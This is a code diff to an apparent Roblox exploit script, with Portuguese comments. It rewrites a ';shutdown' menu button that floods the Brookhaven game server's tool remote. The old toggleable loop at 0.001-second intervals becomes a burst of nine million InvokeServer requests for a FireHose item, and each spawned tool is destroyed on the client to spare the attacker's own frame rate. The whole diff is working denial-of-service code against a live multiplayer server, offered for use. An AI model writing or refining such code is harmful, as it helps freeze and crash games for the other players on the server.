@@ -635,65 +635,62 @@ MainTab:Button({
     Title = ";shutdown",
     Desc = "Derruba o desempenho e congela o ping do servidor usando a sobrecarga da FireHose",
     Callback = function()
-        -- Inverte o estado da variável global (interruptor liga/desliga)
-        _G.LagServerAtivo = not _G.LagServerAtivo
-        
         local Players = game:GetService("Players")
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
         local LocalPlayer = Players.LocalPlayer
         
-        if _G.LagServerAtivo then
-            WindUI:Notify({
-                Title = "⚠️ Colapso Iniciado", 
-                Content = "Spam invisível de FireHose ativado. O servidor começará a travar.", 
-                Duration = 4
-            })
-            
-            task.spawn(function()
-                local remoteFerramenta = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild("1Too1l")
-                
-                while _G.LagServerAtivo do
-                    if not remoteFerramenta then break end
-                    
-                    -- Pede a FireHose para o servidor usando o RemoteFunction padrão do Brookhaven
-                    task.defer(function()
-                        pcall(function()
-                            remoteFerramenta:InvokeServer("PickingTools", "FireHose")
-                        end)
-                    end)
-                    
-                    -- Limpeza em milissegundos no cliente para proteger o SEU computador de lagar
-                    task.defer(function()
-                        -- Verifica na mochila (Backpack)
-                        local mochila = LocalPlayer:FindFirstChild("Backpack")
-                        if mochila then
-                            local hoseNaMochila = mochila:FindFirstChild("FireHose")
-                            if hoseNaMochila then
-                                hoseNaMochila:Destroy()
-                            end
-                        end
-                        
-                        -- Verifica se o item foi direto para as mãos do personagem
-                        local personagem = LocalPlayer.Character
-                        if personagem then
-                            local hoseNoChar = personagem:FindFirstChild("FireHose")
-                            if hoseNoChar then
-                                hoseNoChar:Destroy()
-                            end
-                        end
-                    end)
-                    
-                    -- Intervalo mínimo de 0.001 segundos para maximizar o entupimento de rede do servidor
-                    task.wait(0.001)
-                end
-            end)
-        else
-            WindUI:Notify({
-                Title = "✅ Estabilizado", 
-                Content = "Ataque à FireHose interrompido. A rede do servidor irá estabilizar.", 
-                Duration = 4
-            })
+        local remoteFerramenta = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild("1Too1l")
+        
+        if not remoteFerramenta then
+            WindUI:Notify({Title = "❌ Erro", Content = "Remote de ferramentas do Brookhaven não encontrado.", Duration = 4})
+            return
         end
+
+        WindUI:Notify({
+            Title = "💥 Instabilidade Crítica", 
+            Content = "Disparando sobrecarga massiva de 9.000.000 de pacotes no servidor.", 
+            Duration = 4
+        })
+
+        -- Dispara as requisições em uma thread separada para o seu executor não travar
+        task.spawn(function()
+            -- Loop numérico massivo de 9 milhões de requisições instantâneas
+            for i = 1, 9000000 do 
+                -- Agenda o envio do InvokeServer para segundo plano
+                task.defer(function()
+                    pcall(function()
+                        remoteFerramenta:InvokeServer("PickingTools", "FireHose")
+                    end)
+                end)
+                
+                -- Destrói a ferramenta no seu cliente em milissegundos para salvar o seu FPS
+                task.defer(function()
+                    -- Limpa a Mochila
+                    local mochila = LocalPlayer:FindFirstChild("Backpack")
+                    if mochila then
+                        local hoseNaMochila = mochila:FindFirstChild("FireHose")
+                        if hoseNaMochila then
+                            hoseNaMochila:Destroy()
+                        end
+                    end
+                    
+                    -- Limpa as Mãos
+                    local personagem = LocalPlayer.Character
+                    if personagem then
+                        local hoseNoChar = personagem:FindFirstChild("FireHose")
+                        if hoseNoChar then
+                            hoseNoChar:Destroy()
+                        end
+                    end
+                end)
+            end
+            
+            WindUI:Notify({
+                Title = "✅ Ataque Concluído", 
+                Content = "A carga de 9M de dados foi totalmente injetada na rede da partida.", 
+                Duration = 4
+            })
+        end)
     end
 })
 
